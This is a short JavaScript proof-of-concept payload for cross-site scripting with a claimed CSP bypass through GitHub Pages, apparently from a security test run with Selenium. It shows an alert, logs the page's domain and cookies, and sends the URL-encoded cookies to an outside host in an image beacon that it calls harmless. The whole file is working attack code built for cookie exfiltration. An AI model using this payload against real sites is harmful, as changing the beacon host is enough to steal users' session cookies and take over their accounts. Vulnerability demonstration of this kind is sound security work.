// Proof of XSS Execution with CSP Bypass
alert("🔥 XSS via GitHub Pages Bypass Executed!");

// Console log (captured in selenium)
console.log("✅ XSS Executed Successfully!");
console.log("📍 Domain: " + document.domain);
console.log("🍪 Cookies: " + document.cookie);

// Send harmless beacon request to validate outbound capability
new Image().src = "https://www.google.com/favicon.ico?ref=xss&c=" + encodeURIComponent(document.cookie);
